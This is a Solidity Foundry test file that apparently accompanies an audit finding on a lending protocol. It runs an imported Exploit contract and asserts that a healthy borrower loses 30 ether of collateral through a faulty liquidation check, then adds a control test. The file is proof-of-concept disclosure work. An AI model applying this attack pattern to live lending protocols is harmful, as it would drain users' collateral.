// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, LendStorage, LToken, CollToken} from
    "./58391-h-22-the-liquidation-validation-logic-is-wrong-sherlock-lend.sol";

contract Finding58391Test is Test {
    function test_healthy_account_loses_30_collateral() public {
        Exploit e = new Exploit();
        e.run();
        assertTrue(e.router().wasHealthy(), "80 <= 100 before the bogus borrow");
        assertEq(e.coll().balanceOf(address(e)), 30 ether, "liquidator took 30");
        assertEq(e.coll().balanceOf(address(e.router())), 70 ether, "router left with 70");
        (uint256 b, uint256 c) = e.lendStorage().users(e.borrower());
        assertEq(b, 80 ether, "borrow");
        assertEq(c, 100 ether, "collateral still covers the debt");
    }

    function test_control_zero_borrow_amount_is_not_liquidatable() public {
        LendStorage store = new LendStorage();
        store.setUser(address(0xB0BB0B), 80 ether, 100 ether);
        (uint256 borrowed, uint256 collateral) =
            store.getHypotheticalAccountLiquidityCollateral(address(0xB0BB0B), LToken(payable(address(0))), 0, 0);
        assertLe(borrowed, collateral, "healthy when seize size is not treated as new debt");
        (borrowed, collateral) =
            store.getHypotheticalAccountLiquidityCollateral(address(0xB0BB0B), LToken(payable(address(0))), 0, 30 ether);
        assertGt(borrowed, collateral, "the buggy extra borrow crosses the line");
    }
}
